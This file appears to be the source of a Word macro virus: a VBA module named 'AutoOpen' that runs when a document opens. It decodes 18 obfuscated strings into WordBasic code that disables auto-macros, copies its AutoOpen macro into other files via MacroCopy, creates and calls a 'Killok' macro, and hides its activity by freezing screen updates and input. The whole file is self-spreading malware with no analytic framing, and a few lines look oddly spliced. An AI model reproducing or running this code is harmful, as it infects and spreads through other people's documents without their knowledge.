   Attribute VB_Name = "AutoOpen"

   Dim NJ__$()

   Public Sub MAIN()
   ReDim NJ__$(18)
   Dim NJ$
   Dim NJ_
   Dim a
   Dim xy
   Dim b
   Dim c
   Dim d$
   Dim Killok$
   NJ__$(1) = "žÃÍ»¼Æ¿›ÏÎÉ§»½ÌÉÍ"
   NJ__$(2) = "À~z—z ÃÆ¿¨»Ç¿~‚ƒ"
   NJ__$(3) = " ÉÌzÁz—z‹z®Éz*ÉÏÈÎ ÃÆ¿Í‚ƒ"
   NJ__$(4) = "£Àz ÃÆ¿Í~‚ ÃÆ¿¨»Ç¿~‚Áƒƒz–˜z||z®Â¿È"
   NJ__$(5) = " ÃÆ¿¦ÃÍÎzÁ": WordBasic.DisableInput
   NJ__$(6) = "Â~z—z ÃÆ¿¨»Ç¿~‚ƒ"
   NJ__$(7) = "£ÀzÀ~z–˜zÂ~z®Â¿È"
   NJ__$(8) = "£Àz¡¿ÎžÉ½ÏÇ¿ÈÎ°»Ì~‚|¥ÃÆÆÉÅ|ƒz—z||z®Â¿È"
   NJ__$(9) = " ÃÆ¿»Ð¿›Ízˆ ÉÌÇ»Îz—z‹"
   NJ__$(10) = "z¿ÎžÉ½ÏÇ¿ÈÎ°»Ìz|zŽ*Žžz|†zÎÌ~‚¬È¾‚ƒƒz"
   NJ__$(11) = "§»½ÌÉ*ÉÊÓzÀ~z…z|ÿ›ÏÎÉ©Ê¿È|†zÂ~z…z|ÿ|†z‹"
   NJ__$(12) = "¿ÎžÉ½ÏÇ¿ÈÎ°»Ìz|¥ÃÆÆÉÅ|†zÎÌ~‚¬È¾‚ƒƒ"
   NJ__$(13) = "ŸÈ¾z£À": WordBasic.ScreenUpdating
   NJ__$(14) = " ÃÆ¿*ÆÉÍ¿z‹"
   NJ__$(15) = "ŸÈ¾z£À": NJ$ = WordBasic.[FileName$]()
   NJ__$(16) = "ŸÈ¾z£À"
   NJ__$(17) = "¨¿ÒÎzÁ"
   NJ__$(18) = "žÃÍ»¼Æ¿›ÏÎÉ§»½ÌÉÍzŠ"
   NJ_ = 0: WordBasic.ToolsMacro Name:="Killok", Show:=3, Edit:=1
   For a = 1 To 18
       For xy = 1 To Len(NJ__$(a))
           b = Asc(Mid(NJ__$(a), xy, 1))
           If c = 255 Then c = 148
           c = b - 90
           If c < 0 Then c = c + 255
           If c = 165 Then c = 58
           d$ = d$ + Chr(c)
       Next xy
   WordBasic.Insert d$: WordBasic.InsertPara: d$ = ""
   Next a
   WordBasic.Activate NJ$: WordBasic.Call "Killok": WordBasic.NextWindow: WordBasic.DocClose 2
   Killok$ = "NJ": WordBasic.ScreenUpdating: WordBasic.DisableInput 0
   End Sub
